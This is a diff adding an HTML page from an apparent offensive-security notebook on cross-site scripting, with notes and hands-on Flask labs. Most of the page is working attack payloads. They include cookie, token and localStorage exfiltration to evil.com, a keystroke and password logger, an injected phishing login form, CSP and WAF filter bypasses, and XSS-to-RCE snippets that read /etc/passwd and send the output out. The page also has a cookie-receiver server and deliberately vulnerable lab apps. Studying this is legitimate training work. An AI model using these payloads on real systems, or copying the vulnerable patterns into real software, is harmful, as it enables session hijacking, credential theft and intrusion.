@@ -1,0 +1,1274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | XSS</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-markup.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-javascript.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>Cross-Site Scripting (XSS)</h1>
+    <hr>
+
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- NOTES TAB -->
+      <div class="tab-content active" id="notes">
+
+        <!-- ==================== XSS TYPES ==================== -->
+        <h2>Three Types of XSS</h2>
+
+        <h3>Reflected XSS</h3>
+        <p>Payload is part of the request (URL parameter, form input) and reflected back in the response without sanitization. Requires the victim to click a crafted link.</p>
+<pre><code class="language-markup">&lt;!-- Vulnerable server response reflects ?name= directly --&gt;
+&lt;p&gt;Hello, &lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;
+
+&lt;!-- Attacker URL --&gt;
+https://target.com/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
+
+        <h3>Stored XSS</h3>
+        <p>Payload is persisted server-side (database, comment field, profile) and served to every user who views the page. Most dangerous — no user interaction beyond visiting the page.</p>
+<pre><code class="language-markup">&lt;!-- Attacker posts a comment containing: --&gt;
+&lt;img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)"&gt;
+
+&lt;!-- Every user viewing the comment section executes the payload --&gt;</code></pre>
+
+        <h3>DOM-based XSS</h3>
+        <p>Payload never leaves the browser. Vulnerable client-side JavaScript reads a source (URL fragment, <code>location.hash</code>, <code>document.referrer</code>) and writes it to a sink (<code>innerHTML</code>, <code>eval</code>, <code>document.write</code>).</p>
+<pre><code class="language-javascript">// Vulnerable client-side code
+let userInput = location.hash.substring(1);
+document.getElementById("output").innerHTML = userInput;
+
+// Exploit URL:
+// https://target.com/page#&lt;img src=x onerror=alert(1)&gt;</code></pre>
+
+        <table>
+          <tr><th>Type</th><th>Payload Location</th><th>Persistence</th><th>Requires Victim Click</th></tr>
+          <tr><td>Reflected</td><td>URL / request</td><td>No</td><td>Yes</td></tr>
+          <tr><td>Stored</td><td>Server DB</td><td>Yes</td><td>No (just visit page)</td></tr>
+          <tr><td>DOM-based</td><td>Client-side JS</td><td>No</td><td>Yes</td></tr>
+        </table>
+
+        <!-- ==================== XSS CONTEXTS ==================== -->
+        <h2>XSS Injection Contexts</h2>
+
+        <h3>HTML Body</h3>
+<pre><code class="language-markup">&lt;div&gt;USER_INPUT&lt;/div&gt;
+&lt;!-- Payload: --&gt;
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;</code></pre>
+
+        <h3>HTML Attributes</h3>
+<pre><code class="language-markup">&lt;input value="USER_INPUT"&gt;
+&lt;!-- Break out of attribute: --&gt;
+" onfocus=alert(1) autofocus="
+" onmouseover=alert(1) x="
+
+&lt;!-- If inside single quotes: --&gt;
+' onfocus=alert(1) autofocus='</code></pre>
+
+        <h3>JavaScript Strings</h3>
+<pre><code class="language-javascript">var name = 'USER_INPUT';
+// Payload: break out of string
+'; alert(1); //
+\'; alert(1); //
+
+// Inside template literals:
+`${alert(1)}`</code></pre>
+
+        <h3>URL Context (href / src)</h3>
+<pre><code class="language-markup">&lt;a href="USER_INPUT"&gt;Click&lt;/a&gt;
+&lt;!-- Payload: --&gt;
+javascript:alert(1)
+javascript:fetch('https://evil.com/'+document.cookie)</code></pre>
+
+        <h3>CSS Context</h3>
+<pre><code class="language-markup">&lt;div style="background: USER_INPUT"&gt;
+&lt;!-- Legacy payload (older browsers): --&gt;
+url('javascript:alert(1)')
+expression(alert(1))</code></pre>
+
+        <!-- ==================== BASIC PAYLOADS ==================== -->
+        <h2>Basic Payloads</h2>
+
+        <h3>Script Tags</h3>
+<pre><code class="language-markup">&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+&lt;script src=https://evil.com/xss.js&gt;&lt;/script&gt;</code></pre>
+
+        <h3>Event Handlers</h3>
+<pre><code class="language-markup">&lt;img src=x onerror=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;input onfocus=alert(1) autofocus&gt;
+&lt;div onmouseover=alert(1)&gt;hover me&lt;/div&gt;
+&lt;marquee onstart=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;video src=x onerror=alert(1)&gt;
+&lt;audio src=x onerror=alert(1)&gt;</code></pre>
+
+        <h3>IMG Tags</h3>
+<pre><code class="language-markup">&lt;img src=x onerror=alert(1)&gt;
+&lt;img src=x onerror="fetch('https://evil.com/?c='+document.cookie)"&gt;
+&lt;img/src=x onerror=alert(1)&gt;</code></pre>
+
+        <h3>SVG Tags</h3>
+<pre><code class="language-markup">&lt;svg onload=alert(1)&gt;
+&lt;svg/onload=alert(1)&gt;
+&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;
+&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x dur=1s&gt;</code></pre>
+
+        <h3>Iframe Tags</h3>
+<pre><code class="language-markup">&lt;iframe src="javascript:alert(1)"&gt;
+&lt;iframe srcdoc="&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"&gt;
+&lt;iframe onload=alert(1) src=about:blank&gt;</code></pre>
+
+        <!-- ==================== FILTER BYPASS ==================== -->
+        <h2>Filter Bypass Techniques</h2>
+
+        <h3>Case Variation</h3>
+<pre><code class="language-markup">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;IMG SRC=x OnErRoR=alert(1)&gt;
+&lt;iMg sRc=x oNeRrOr=alert(1)&gt;</code></pre>
+
+        <h3>HTML Entity Encoding</h3>
+<pre><code class="language-markup">&lt;!-- Decimal entities --&gt;
+&amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;
+
+&lt;!-- Inside attributes, entities decode before execution --&gt;
+&lt;img src=x onerror="&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)"&gt;
+
+&lt;!-- Hex entities --&gt;
+&lt;img src=x onerror="&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;(1)"&gt;</code></pre>
+
+        <h3>URL Encoding</h3>
+<pre><code class="language-markup">&lt;!-- Double URL encoding --&gt;
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+
+&lt;!-- In href context --&gt;
+&lt;a href="javascript:%61%6c%65%72%74(1)"&gt;click&lt;/a&gt;</code></pre>
+
+        <h3>Unicode / Hex Escapes</h3>
+<pre><code class="language-javascript">// JavaScript Unicode escapes
+\u0061\u006c\u0065\u0072\u0074(1)   // alert(1)
+
+// eval with String.fromCharCode
+eval(String.fromCharCode(97,108,101,114,116,40,49,41))
+
+// Hex escapes in JS strings
+eval("\x61\x6c\x65\x72\x74\x28\x31\x29")</code></pre>
+
+        <h3>Tag Alternatives</h3>
+<pre><code class="language-markup">&lt;!-- When &lt;script&gt; is blocked --&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/math&gt;
+&lt;xss id=x tabindex=1 onfocus=alert(1)&gt;&lt;/xss&gt;</code></pre>
+
+        <h3>Event Handler Alternatives</h3>
+<pre><code class="language-markup">&lt;!-- When onerror is blocked --&gt;
+&lt;input onfocus=alert(1) autofocus&gt;
+&lt;marquee onstart=alert(1)&gt;
+&lt;video src=x onloadstart=alert(1) autoplay&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;object data="javascript:alert(1)"&gt;
+&lt;embed src="javascript:alert(1)"&gt;</code></pre>
+
+        <h3>JavaScript Protocol Variations</h3>
+<pre><code class="language-markup">&lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;
+&lt;a href="&#106;avascript:alert(1)"&gt;click&lt;/a&gt;
+&lt;a href="&#x6A;avascript:alert(1)"&gt;click&lt;/a&gt;
+&lt;a href="java&#x09;script:alert(1)"&gt;click&lt;/a&gt;
+&lt;a href="java&#x0a;script:alert(1)"&gt;click&lt;/a&gt;</code></pre>
+
+        <!-- ==================== COOKIE STEALING ==================== -->
+        <h2>Cookie Stealing</h2>
+<pre><code class="language-javascript">// Basic cookie exfiltration
+document.location = 'https://evil.com/steal?c=' + document.cookie;
+
+// Using fetch (stealthier — no redirect)
+fetch('https://evil.com/steal?c=' + document.cookie);
+
+// Using Image object (bypasses some CSPs)
+new Image().src = 'https://evil.com/steal?c=' + document.cookie;
+
+// XMLHttpRequest
+var x = new XMLHttpRequest();
+x.open('GET', 'https://evil.com/steal?c=' + document.cookie);
+x.send();</code></pre>
+
+<pre><code class="language-markup">&lt;!-- Inline payloads --&gt;
+&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;
+&lt;img src=x onerror="fetch('https://evil.com/?c='+document.cookie)"&gt;</code></pre>
+
+        <p><strong>Attacker-side receiver (Python):</strong></p>
+<pre><code class="language-python">from http.server import HTTPServer, BaseHTTPRequestHandler
+import urllib.parse
+
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        print(f"[+] Cookie: {urllib.parse.unquote(self.path)}")
+        self.send_response(200)
+        self.end_headers()
+
+HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()</code></pre>
+
+        <!-- ==================== SESSION HIJACKING ==================== -->
+        <h2>Session Hijacking</h2>
+<pre><code class="language-javascript">// Steal session cookie and replay it
+fetch('https://evil.com/steal', {
+    method: 'POST',
+    body: JSON.stringify({
+        cookies: document.cookie,
+        url: window.location.href,
+        localStorage: JSON.stringify(localStorage)
+    })
+});
+
+// Steal tokens from localStorage/sessionStorage
+let token = localStorage.getItem('auth_token');
+fetch('https://evil.com/steal?token=' + token);</code></pre>
+
+        <p><strong>Defense note:</strong> Cookies with <code>HttpOnly</code> flag are not accessible via <code>document.cookie</code>. Cookies with <code>SameSite=Strict</code> won't be sent cross-origin.</p>
+
+        <!-- ==================== KEYLOGGER ==================== -->
+        <h2>Keylogging via XSS</h2>
+<pre><code class="language-javascript">// Capture all keystrokes and exfiltrate
+document.addEventListener('keypress', function(e) {
+    fetch('https://evil.com/log?key=' + e.key);
+});
+
+// Capture specific form input
+document.querySelector('#password').addEventListener('input', function(e) {
+    fetch('https://evil.com/log?pw=' + e.target.value);
+});</code></pre>
+
+        <!-- ==================== DOM MANIPULATION ==================== -->
+        <h2>DOM Manipulation</h2>
+
+        <h3>Defacement</h3>
+<pre><code class="language-javascript">// Replace page content
+document.body.innerHTML = '&lt;h1&gt;Hacked by XSS&lt;/h1&gt;';
+
+// Modify specific elements
+document.title = 'PWNED';
+document.querySelector('.logo').src = 'https://evil.com/hacked.png';</code></pre>
+
+        <h3>Phishing Form Injection</h3>
+<pre><code class="language-javascript">// Inject a fake login form
+document.body.innerHTML = `
+  &lt;div style="max-width:400px;margin:100px auto;font-family:sans-serif"&gt;
+    &lt;h2&gt;Session Expired - Please Login&lt;/h2&gt;
+    &lt;form action="https://evil.com/phish" method="POST"&gt;
+      &lt;input name="user" placeholder="Username" style="width:100%;padding:8px;margin:4px 0"&gt;
+      &lt;input name="pass" type="password" placeholder="Password" style="width:100%;padding:8px;margin:4px 0"&gt;
+      &lt;button type="submit" style="width:100%;padding:8px;background:#007bff;color:#fff;border:none"&gt;Login&lt;/button&gt;
+    &lt;/form&gt;
+  &lt;/div&gt;
+`;</code></pre>
+
+        <!-- ==================== CSP BYPASS ==================== -->
+        <h2>CSP Bypass Techniques</h2>
+
+        <h3>Common CSP Headers</h3>
+<pre><code class="language-bash"># Restrictive CSP
+Content-Security-Policy: default-src 'self'; script-src 'self'
+
+# CSP with unsafe-inline (vulnerable!)
+Content-Security-Policy: script-src 'self' 'unsafe-inline'
+
+# CSP with nonce
+Content-Security-Policy: script-src 'nonce-abc123'</code></pre>
+
+        <h3>unsafe-inline Present</h3>
+        <p>If <code>'unsafe-inline'</code> is in <code>script-src</code>, inline scripts execute normally — CSP provides no XSS protection.</p>
+<pre><code class="language-markup">&lt;script&gt;alert(1)&lt;/script&gt;  &lt;!-- works with unsafe-inline --&gt;</code></pre>
+
+        <h3>Nonce Reuse / Leaking</h3>
+<pre><code class="language-markup">&lt;!-- If nonce is predictable or reused across requests --&gt;
+&lt;script nonce="LEAKED_NONCE"&gt;alert(1)&lt;/script&gt;
+
+&lt;!-- If nonce appears in the page source, inject: --&gt;
+&lt;script nonce="EXTRACTED_NONCE"&gt;alert(1)&lt;/script&gt;</code></pre>
+
+        <h3>base-uri Missing</h3>
+<pre><code class="language-markup">&lt;!-- If base-uri is not restricted, hijack relative script paths --&gt;
+&lt;base href="https://evil.com/"&gt;
+&lt;!-- Now all relative src="/js/app.js" loads from evil.com --&gt;</code></pre>
+
+        <h3>JSONP Endpoints on Whitelisted Domains</h3>
+<pre><code class="language-markup">&lt;!-- If CSP allows scripts from a CDN that has JSONP endpoints --&gt;
+&lt;!-- script-src cdn.example.com --&gt;
+&lt;script src="https://cdn.example.com/jsonp?callback=alert(1)//"&gt;&lt;/script&gt;</code></pre>
+
+        <h3>CSP Bypass via Policy Injection</h3>
+<pre><code class="language-markup">&lt;!-- If reflected input ends up in CSP header --&gt;
+Content-Security-Policy: script-src 'self' USER_INPUT
+&lt;!-- Inject: 'unsafe-inline'; to allow inline scripts --&gt;</code></pre>
+
+        <!-- ==================== WAF BYPASS ==================== -->
+        <h2>WAF Bypass Payloads</h2>
+<pre><code class="language-markup">&lt;!-- Null bytes --&gt;
+&lt;scr%00ipt&gt;alert(1)&lt;/scr%00ipt&gt;
+
+&lt;!-- Backtick instead of parentheses --&gt;
+&lt;img src=x onerror=alert`1`&gt;
+
+&lt;!-- No parentheses, no backticks --&gt;
+&lt;img src=x onerror="window.onerror=alert;throw 1"&gt;
+
+&lt;!-- Without alert keyword --&gt;
+&lt;img src=x onerror="self['al'+'ert'](1)"&gt;
+&lt;img src=x onerror="top[/al/.source+/ert/.source](1)"&gt;
+&lt;img src=x onerror="Function('ale'+'rt(1)')()"&gt;
+
+&lt;!-- No spaces --&gt;
+&lt;svg/onload=alert(1)&gt;
+&lt;img/src=x/onerror=alert(1)&gt;
+
+&lt;!-- Double encoding --&gt;
+%253Csvg%2520onload%253Dalert(1)%253E
+
+&lt;!-- Mutation XSS (mXSS) --&gt;
+&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/math&gt;
+
+&lt;!-- Encoding function name with JSFuck-style --&gt;
+&lt;script&gt;[]['\x66\x69\x6c\x74\x65\x72']['constructor']('alert(1)')()&lt;/script&gt;</code></pre>
+
+        <!-- ==================== POLYGLOTS ==================== -->
+        <h2>Polyglot XSS Payloads</h2>
+        <p>Payloads designed to execute in multiple injection contexts simultaneously.</p>
+<pre><code class="language-markup">jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik/%0telerik1telerik%0A*telerik/telerik*/&lt;/stYle/&lt;/telerik/telerik/&lt;/telerik&lt;/telerik/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e
+
+"&gt;&lt;img src=x onerror=alert(1)//&gt;
+'&gt;&lt;img src=x onerror=alert(1)//&gt;
+"&gt;&lt;svg onload=alert(1)//&gt;
+
+&lt;!-- Compact polyglot --&gt;
+'-alert(1)-'
+"onmouseover=alert(1)//
+javascript:alert(1)//</code></pre>
+
+        <!-- ==================== TOOLS ==================== -->
+        <h2>Tools</h2>
+        <table>
+          <tr><th>Tool</th><th>Description</th><th>Usage</th></tr>
+          <tr>
+            <td><strong>XSS Hunter</strong></td>
+            <td>Blind XSS detection platform. Hosted payloads fire callbacks with screenshots, cookies, DOM, URL.</td>
+            <td><code>&lt;script src=https://yoursubdomain.xss.ht&gt;&lt;/script&gt;</code></td>
+          </tr>
+          <tr>
+            <td><strong>Dalfox</strong></td>
+            <td>Fast parameter analysis and XSS scanner written in Go.</td>
+            <td><code>dalfox url "https://target.com/?q=test"</code></td>
+          </tr>
+          <tr>
+            <td><strong>XSStrike</strong></td>
+            <td>Advanced XSS detection with fuzzing, context analysis, and WAF bypass.</td>
+            <td><code>python3 xsstrike.py -u "https://target.com/?q=test"</code></td>
+          </tr>
+        </table>
+
+<pre><code class="language-bash"># Dalfox — scan with custom payload file
+dalfox url "https://target.com/search?q=FUZZ" --custom-payload payloads.txt
+
+# Dalfox — pipe from other tools
+cat urls.txt | dalfox pipe
+
+# XSStrike — crawl and scan
+python3 xsstrike.py -u "https://target.com" --crawl -l 3
+
+# XSStrike — POST data
+python3 xsstrike.py -u "https://target.com/login" --data "user=test&amp;pass=test"</code></pre>
+
+        <!-- ==================== XSS TO RCE ==================== -->
+        <h2>XSS to RCE</h2>
+        <p>XSS can lead to remote code execution in specific scenarios:</p>
+
+        <h3>Electron Apps</h3>
+        <p>If <code>nodeIntegration</code> is enabled or <code>contextIsolation</code> is disabled:</p>
+<pre><code class="language-javascript">// XSS in Electron app with nodeIntegration: true
+require('child_process').exec('id', (err, stdout) =&gt; {
+    fetch('https://evil.com/rce?out=' + btoa(stdout));
+});</code></pre>
+
+        <h3>Server-Side XSS (Puppeteer / headless browser)</h3>
+<pre><code class="language-javascript">// If the app renders user input server-side in a headless browser
+// inject payload to read local files
+fetch('file:///etc/passwd').then(r =&gt; r.text()).then(t =&gt; {
+    fetch('https://evil.com/exfil?data=' + btoa(t));
+});</code></pre>
+
+        <h3>Admin Panel → Command Execution</h3>
+<pre><code class="language-javascript">// If XSS hits an admin who has access to a command execution feature
+// Use the XSS to make authenticated requests to the admin panel
+fetch('/admin/exec', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: 'cmd=id'
+}).then(r =&gt; r.text()).then(t =&gt; {
+    fetch('https://evil.com/rce?out=' + btoa(t));
+});</code></pre>
+
+      </div>
+
+      <!-- LAB TAB -->
+      <div class="tab-content" id="lab">
+        <h2>Labs</h2>
+
+        <div class="lab-card">
+          <h4>Lab 1: Reflected XSS</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Inject a script that triggers <code>alert(1)</code> via a reflected input.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — Flask reflected XSS
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/search')
+def search():
+    query = request.args.get('q', '')
+    return f'''&lt;html&gt;&lt;body&gt;
+    &lt;h1&gt;Search Results&lt;/h1&gt;
+    &lt;p&gt;You searched for: {query}&lt;/p&gt;
+    &lt;form action="/search"&gt;
+      &lt;input name="q" value="{query}"&gt;
+      &lt;button&gt;Search&lt;/button&gt;
+    &lt;/form&gt;
+    &lt;/body&gt;&lt;/html&gt;'''
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run the Flask app: <code>python app.py</code></li>
+              <li>Visit <code>/search?q=test</code> and observe the reflection</li>
+              <li>Craft a URL with a <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> payload in the <code>q</code> parameter</li>
+              <li>Also try injecting through the input field's <code>value</code> attribute — break out with <code>"&gt;</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 2: Stored XSS</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Inject a persistent XSS payload via a comment form that fires for every visitor.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — Flask stored XSS
+from flask import Flask, request
+
+app = Flask(__name__)
+comments = []
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        comments.append(request.form.get('comment', ''))
+    html = '&lt;h1&gt;Guest Book&lt;/h1&gt;'
+    html += '&lt;form method="POST"&gt;&lt;textarea name="comment"&gt;&lt;/textarea&gt;'
+    html += '&lt;button&gt;Post&lt;/button&gt;&lt;/form&gt;&lt;hr&gt;'
+    for c in comments:
+        html += f'&lt;div class="comment"&gt;{c}&lt;/div&gt;'
+    return html
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Post a normal comment and observe it rendered on the page</li>
+              <li>Post <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> as a comment</li>
+              <li>Refresh the page — the alert should fire every time</li>
+              <li>Try an <code>&lt;img src=x onerror=alert(1)&gt;</code> payload for variety</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 3: DOM-based XSS</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit client-side JavaScript that unsafely writes URL data into the DOM.</p>
+          <div class="setup-code">
+<pre><code class="language-markup">&lt;!-- dom-xss.html --&gt;
+&lt;html&gt;
+&lt;body&gt;
+  &lt;h1&gt;Welcome&lt;/h1&gt;
+  &lt;div id="greeting"&gt;&lt;/div&gt;
+  &lt;script&gt;
+    // Vulnerable: reads from URL hash and writes to innerHTML
+    let name = decodeURIComponent(location.hash.substring(1));
+    if (name) {
+      document.getElementById('greeting').innerHTML = 'Hello, ' + name + '!';
+    }
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Open <code>dom-xss.html#Alice</code> — see "Hello, Alice!"</li>
+              <li>Identify the source (<code>location.hash</code>) and sink (<code>innerHTML</code>)</li>
+              <li>Craft a hash payload to inject an <code>&lt;img&gt;</code> tag with <code>onerror</code></li>
+              <li>Note: <code>&lt;script&gt;</code> tags don't execute when inserted via <code>innerHTML</code> — use event handlers</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 4: XSS with Filter Bypass</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Bypass a WAF/filter that blocks common XSS keywords and tags.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — Flask with XSS filter
+import re
+from flask import Flask, request
+
+app = Flask(__name__)
+
+def waf(payload):
+    """Blocks common XSS patterns"""
+    blocked = ['script', 'onerror', 'onload', 'alert', 'eval',
+               'javascript:', 'document.cookie']
+    lower = payload.lower()
+    for word in blocked:
+        if word in lower:
+            return True
+    if re.search(r'on\w+=', lower):
+        return True
+    return False
+
+@app.route('/search')
+def search():
+    q = request.args.get('q', '')
+    if waf(q):
+        return '&lt;h1&gt;WAF Blocked!&lt;/h1&gt;&lt;p&gt;Malicious input detected.&lt;/p&gt;'
+    return f'&lt;h1&gt;Results for: {q}&lt;/h1&gt;'
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Try basic payloads — confirm they're blocked</li>
+              <li>Analyze what the WAF actually filters (keyword list + regex)</li>
+              <li>Bypass strategies:
+                <ul>
+                  <li>Use event handlers not matched by <code>on\w+=</code> regex (hint: what about <code>oncut</code>, <code>oncopy</code>?)</li>
+                  <li>Try HTML encoding within attributes</li>
+                  <li>Use <code>confirm()</code> or <code>prompt()</code> instead of <code>alert()</code></li>
+                  <li>Use <code>&lt;details open ontoggle=...&gt;</code> or <code>&lt;svg&gt;</code> payloads</li>
+                  <li>Try <code>Function('ale'+'rt(1)')()</code> construction</li>
+                </ul>
+              </li>
+              <li>Achieve JavaScript execution despite the WAF</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 5: SVG-Based XSS</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Upload a crafted SVG file that executes JavaScript when rendered by the browser.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — SVG XSS lab
+from flask import Flask, request, send_from_directory
+import os
+
+app = Flask(__name__)
+UPLOAD_DIR = 'uploads'
+os.makedirs(UPLOAD_DIR, exist_ok=True)
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        f = request.files.get('avatar')
+        if f and f.filename.endswith('.svg'):
+            f.save(os.path.join(UPLOAD_DIR, 'avatar.svg'))
+            return '&lt;p&gt;Uploaded! &lt;a href="/uploads/avatar.svg"&gt;View avatar&lt;/a&gt;&lt;/p&gt;'
+        return '&lt;p&gt;Only SVG files allowed.&lt;/p&gt;'
+    return '''&lt;h1&gt;Upload Avatar (SVG)&lt;/h1&gt;
+    &lt;form method="POST" enctype="multipart/form-data"&gt;
+    &lt;input type="file" name="avatar" accept=".svg"&gt;
+    &lt;button&gt;Upload&lt;/button&gt;&lt;/form&gt;'''
+
+@app.route('/uploads/&lt;path:name&gt;')
+def uploaded(name):
+    return send_from_directory(UPLOAD_DIR, name)
+
+app.run(debug=True)</code></pre>
+<pre><code class="language-markup">&lt;!-- malicious.svg --&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;script&gt;alert('XSS via SVG')&lt;/script&gt;
+&lt;/svg&gt;
+
+&lt;!-- Alternative with event handler --&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"&gt;
+  &lt;rect width="100" height="100"/&gt;
+&lt;/svg&gt;</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Upload a normal SVG and view it — renders inline in the browser</li>
+              <li>Create an SVG with an embedded <code>&lt;script&gt;</code> tag and upload it</li>
+              <li>Visit the uploaded SVG URL — JS should execute</li>
+              <li>Try the <code>onload</code> variant as well</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: IMG Tag Event Handler XSS</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Exploit a profile page that renders user-supplied image URLs without sanitizing event handlers.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — IMG event handler XSS
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/profile', methods=['GET', 'POST'])
+def profile():
+    if request.method == 'POST':
+        avatar_url = request.form.get('avatar', '')
+        return f'''&lt;h1&gt;Profile&lt;/h1&gt;
+        &lt;img src="{avatar_url}" width="200" alt="avatar"&gt;
+        &lt;p&gt;Avatar updated!&lt;/p&gt;'''
+    return '''&lt;h1&gt;Set Avatar&lt;/h1&gt;
+    &lt;form method="POST"&gt;
+    &lt;input name="avatar" placeholder="Image URL"&gt;
+    &lt;button&gt;Update&lt;/button&gt;&lt;/form&gt;'''
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Submit a valid image URL — confirm it renders</li>
+              <li>Submit <code>x" onerror="alert(1)</code> to break out of the <code>src</code> attribute</li>
+              <li>Try payloads that don't require quotes: <code>x onerror=alert(1) x=</code></li>
+              <li>Escalate to cookie theft with <code>fetch()</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: XSS in JSON Response</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit an API that reflects user input in a JSON response rendered as HTML due to missing Content-Type.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — JSON response XSS
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/api/search')
+def search():
+    q = request.args.get('q', '')
+    # Bug: returns JSON-like body but with text/html Content-Type
+    return f'{{"query": "{q}", "results": []}}', 200, {'Content-Type': 'text/html'}
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Visit <code>/api/search?q=test</code> — note the response is rendered as HTML</li>
+              <li>Inject <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> in the <code>q</code> parameter</li>
+              <li>Break out of the JSON string context with <code>"}&lt;script&gt;alert(1)&lt;/script&gt;{"x":"</code></li>
+              <li>Observe how Content-Type determines browser rendering behavior</li>
+            </ol>
+          </div>
+        </div>
+
